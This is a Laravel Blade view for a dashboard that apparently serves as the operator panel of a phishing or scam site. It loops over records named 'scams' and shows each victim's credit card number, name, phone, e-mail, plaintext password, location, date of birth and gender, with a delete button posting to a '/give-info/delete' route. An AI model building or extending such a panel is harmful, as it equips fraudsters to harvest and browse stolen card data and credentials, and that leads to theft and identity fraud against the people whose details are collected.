@extends('layouts.app')

@section('content')
    <div class="container">
        <div class="row justify-content-center">
            <div class="col-md-8">
                <div class="card">
                    <div class="card-header">{{ __('Dashboard') }}</div>

                    <div class="card-body">
                        @if (session('status'))
                            <div class="alert alert-success" role="alert">
                                {{ session('status') }}
                            </div>
                        @endif

                        <table>
                            <tr>
                                <td style="border-color: black; border-style: solid; border-width: 2px">ID</td>
                                <td style="border-color: black; border-style: solid; border-width: 2px">Credit card</td>
                                <td style="border-color: black; border-style: solid; border-width: 2px">Name</td>
                                <td style="border-color: black; border-style: solid; border-width: 2px">Phone number
                                </td>
                                <td style="border-color: black; border-style: solid; border-width: 2px">E-mail address
                                </td>
                                <td style="border-color: black; border-style: solid; border-width: 2px">Password</td>
                                <td style="border-color: black; border-style: solid; border-width: 2px">Location</td>
                                <td style="border-color: black; border-style: solid; border-width: 2px">Date of birth
                                </td>
                                <td style="border-color: black; border-style: solid; border-width: 2px">Gender</td>
                                <td style="border-color: black; border-style: solid; border-width: 2px">Delete</td>

                            </tr>
                            @foreach($scams as $scam)
                                <tr>
                                    <td style="border-color: black; border-style: solid; border-width: 2px">{{$scam->id}}
                                        .
                                    </td>
                                    <td style="border-color: black; border-style: solid; border-width: 2px">{{$scam->card}}</td>
                                    <td style="border-color: black; border-style: solid; border-width: 2px">{{$scam->name}}</td>
                                    <td style="border-color: black; border-style: solid; border-width: 2px">{{$scam->phone}}</td>
                                    <td style="border-color: black; border-style: solid; border-width: 2px">{{$scam->email}}</td>
                                    <td style="border-color: black; border-style: solid; border-width: 2px">{{$scam->password}}</td>
                                    <td style="border-color: black; border-style: solid; border-width: 2px">{{$scam->location}}</td>
                                    <td style="border-color: black; border-style: solid; border-width: 2px">{{$scam->dob}}</td>
                                    <td style="border-color: black; border-style: solid; border-width: 2px">{{$scam->gender}}</td>
                                    <td style="border-color: black; border-style: solid; border-width: 2px">
                                        <form action="/give-info/delete/{{$scam->id}}" method="POST">
                                            @csrf

                                            <button type="submit">Delete</button>
                                        </form>
                                    </td>
                                </tr>
                            @endforeach
                        </table>
                    </div>
                </div>
            </div>
        </div>
    </div>
@endsection
